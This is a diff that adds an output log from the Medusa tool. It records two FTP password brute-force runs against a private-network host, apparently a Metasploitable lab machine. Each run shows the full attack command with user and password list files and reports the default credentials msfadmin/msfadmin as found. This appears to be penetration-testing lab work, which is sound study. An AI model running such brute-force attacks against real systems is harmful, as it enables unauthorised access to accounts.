@@ -1,0 +1,8 @@
+# Medusa v.2.3 (2026-11-24 14:53:12)
+# medusa -h 192.168.56.103 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -O resultados-ftp-medusa.txt 
+2026-11-24 14:53:12 ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-11-24 14:53:15).
+# Medusa v.2.3 (2026-11-24 15:00:19)
+# medusa -h 192.168.56.103 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -O resultados-ftp-medusa.txt 
+2026-11-24 15:00:19 ACCOUNT FOUND: [ftp] Host: 192.168.56.103 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-11-24 15:00:21).
